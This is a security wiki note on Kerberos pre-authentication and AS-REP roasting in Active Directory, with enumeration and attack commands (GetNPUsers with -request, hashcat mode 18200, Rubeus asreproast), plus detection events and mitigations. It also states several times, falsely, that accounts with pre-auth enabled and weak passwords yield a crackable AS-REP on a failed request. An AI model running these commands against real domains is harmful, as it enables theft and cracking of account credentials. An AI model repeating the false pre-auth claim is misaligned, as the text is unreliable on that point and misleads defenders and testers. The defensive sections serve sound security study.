---
title: Kerberos Pre-Authentication
type: concept
created: 2026-09-06
updated: 2026-09-06
tags: [kerberos, active-directory, preauth, protocol]
---

# Kerberos Pre-Authentication

Before the KDC issues a TGT, the AS-REQ can carry **pre-authentication data**
proving the client knows the account's password/keys. The default form is
**PA-ENC-TIMESTAMP**: the client encrypts a timestamp with the password-derived
key and sends it; the KDC decrypts it to verify knowledge *before* issuing
anything. What the KDC does on failure is exactly what makes
[[as-rep-roasting]] possible, and whether pre-auth is required at all is the
pivot for a whole class of offline attacks.

## The two preauth regimes

- **Pre-auth required (default).** Client sends PA-ENC-TIMESTAMP encrypted
  with the password key. On a *wrong/absent* key the KDC can return an
  AS-REP containing an **encrypted timestamp** — that AS-REP is encrypted
  with the *user's* hash and can be captured and cracked offline
  ([[as-rep-roasting]]). AS-REP roasting specifically targets accounts with
  pre-auth **enabled** but a *weak* password, because a failed AS-REQ still
  yields the roastable AS-REP.
- **Pre-auth NOT required** (`userAccountControl` flag
  `DONT_REQ_PREAUTH`, `0x400000`). The account can get a TGT with *no*
  encrypted timestamp at all. An attacker who knows the account name sends a
  blank AS-REQ, the KDC returns an AS-REP encrypted with the user's hash,
  and the attacker cracks it — **no password interaction, no lockout, no
  4769 burst**. This is the canonical [[as-rep-roasting]] target: accounts
  with "Do not require Kerberos preauthentication" checked.

## Why it matters for attacks

- It determines **which** offline attack applies: preauth-disabled →
  AS-REP roasting (blank AS-REQ); preauth-enabled + weak password → AS-REP
  roasting via a failed AS-REQ; SPN account → [[kerberoasting]] (TGS-REQ,
  a different stage).
- It's a **detection** surface: a burst of AS-REQs (4768) for many accounts
  from one client, or 4768s for accounts with preauth disabled, are the
  tells.
- It's a **hardening** control: require preauth everywhere, disable RC4
  ([[kerberos-encryption-types]]), and hunt for the `0x400000` flag.

## Enumeration

```powershell
# Accounts with pre-auth disabled (AS-REP roastable) — PowerView
Get-DomainUser -Properties useraccountcontrol |
  Where-Object {($_.useraccountcontrol -band 4194304) -eq 4194304}

# Or the raw flag check: 0x400000 = 4194304
```

```bash
# Impacket — find accounts that don't require preauth
GetUserSPNs.py ...           # SPN accounts (kerberoastable)
# For AS-REP: attempt a blank AS-REQ per account; the KDC replies with an
# AS-REP only if preauth is not required (or you can force it):
GetNPUsers.py DOMAIN/ -dc-ip <dc-ip> -usersfile users.txt -format hashcat
```

## Triggering / exploiting

```bash
# AS-REP roasting (Impacket GetNPUsers) — harvest AS-REPs for preauth-disabled accounts
GetNPUsers.py CORP/ -dc-ip <dc-ip> -usersfile users.txt -format hashcat -request
# Crack (mode 18200 = AS-REP RC4 / etype 23):
hashcat -m 18200 asrep.txt wordlist.txt
```

```powershell
# Rubeus — AS-REP roast
Rubeus.exe asreproast /user:svc_backup /rc4
```

## Detection

- **Event 4768** (TGT requested) with **preauth type 0** (no preauth) for a
  normal user account — the AS-REP-roast tell.
- A burst of 4768s across many accounts from one source, especially with
  failed preauth — offline harvesting in progress.
- Accounts with the `0x400000` flag present at all (config audit).

## Mitigations

- **Require Kerberos preauthentication** on all user/service accounts; audit
  for `DONT_REQ_PREAUTH`.
- Enforce AES and strong passwords ([[kerberos-encryption-types]], [[gmsa]])
  so a captured AS-REP is uncrackable.
- Alert on 4768 with preauth type 0 and on 4768 bursts.
- [[ad-tiering-and-hardening]] — the overarching baseline.

## Links

- [[as-rep-roasting]] — the attack this regime enables
- [[kerberoasting]] — the TGS-stage contrast (SPN accounts)
- [[kerberos-encryption-types]] — RC4 vs AES in the preauth data
- [[kerberos-authentication]] — the AS-REQ stage this lives in
- [[kerberos-pac]] — issued after preauth succeeds

## References

- [RFC 4120 — Kerberos V5 (pre-authentication)](https://datatracker.ietf.org/doc/html/rfc4120)
- [Impacket GetNPUsers.py](https://docs.impacket-project.org/)
- [ired.team: AS-REP Roasting](https://www.ired.team/active-directory-kerberos-abuse/as-rep-roasting)
